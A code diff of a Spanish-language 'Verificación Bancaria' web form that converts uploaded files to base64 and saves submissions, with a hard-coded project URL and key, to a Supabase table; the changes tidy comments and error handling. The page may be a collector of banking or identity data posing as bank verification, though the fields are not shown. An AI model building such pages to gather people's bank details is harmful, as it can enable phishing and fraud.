@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <title>Verificación Bancaria</title>
 
-<!-- Librería Supabase -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <style>
@@ -14,8 +13,6 @@
   label { display:block; margin-top:12px; font-weight:bold; }
   input { width:100%; padding:10px; margin-top:6px; border:1px solid #ccc; border-radius:6px; font-size:15px; }
   button { margin-top:20px; padding:12px; background:#003366; color:#fff; border:none; border-radius:6px; cursor:pointer; width:100%; font-size:16px; }
-  .error { color:red; font-size:14px; margin-top:4px; }
-  .error-input { border:2px solid red !important; }
   .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); display:flex; justify-content:center; align-items:center; z-index:9999; }
   .modal-box { background:white; padding:25px; border-radius:10px; width:80%; max-width:350px; text-align:center; box-shadow:0 0 10px rgba(0,0,0,0.3); }
   .modal-box h2 { margin-bottom:15px; color:#003366; }
@@ -38,7 +35,6 @@
   <button type="submit">Guardar verificación</button>
 </form>
 
-<!-- MODAL DE ÉXITO -->
 <div id="modalExito" class="modal-overlay" style="display:none;">
   <div class="modal-box">
     <h2>✔ Verificación guardada</h2>
@@ -48,14 +44,11 @@
 </div>
 
 <script>
-/* ---------------- CONEXIÓN A SUPABASE ---------------- */
 const SUPABASE_URL = "https://iomxopcdoygphvulaswb.supabase.co";
 const SUPABASE_ANON_KEY = "sb_publishable_4KqCEnqLVSEETOob_X9c7w_4IOpToI-";
 
-// CORRECCIÓN: usar window.supabase
 const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-/* ---------------- FUNCIONES ---------------- */
 function mostrarModalExito() {
   document.getElementById("modalExito").style.display = "flex";
 }
@@ -73,21 +66,21 @@ function fileToBase64(file) {
   });
 }
 
-/* ---------------- GUARDAR EN SUPABASE ---------------- */
 async function guardarRegistroSupabase(registro) {
   const { data, error } = await supabase
     .from("usuario_verificaciones")
     .insert([registro]);
 
   if (error) {
-    console.error("Error al guardar en Supabase:", error);
     alert("❌ Error al guardar en Supabase: " + error.message);
-  } else {
-    mostrarModalExito();
+    console.error(error);
+    return false;
   }
+
+  mostrarModalExito();
+  return true;
 }
 
-/* ---------------- SUBMIT ---------------- */
 document.getElementById("form").addEventListener("submit", async (e) => {
   e.preventDefault();
   const f = e.target;
@@ -119,8 +112,9 @@ document.getElementById("form").addEventListener("submit", async (e) => {
     fecha: new Date().toISOString()
   };
 
-  await guardarRegistroSupabase(registro);
-  f.reset();
+  const ok = await guardarRegistroSupabase(registro);
+
+  if (ok) f.reset();
 });
 </script>
 
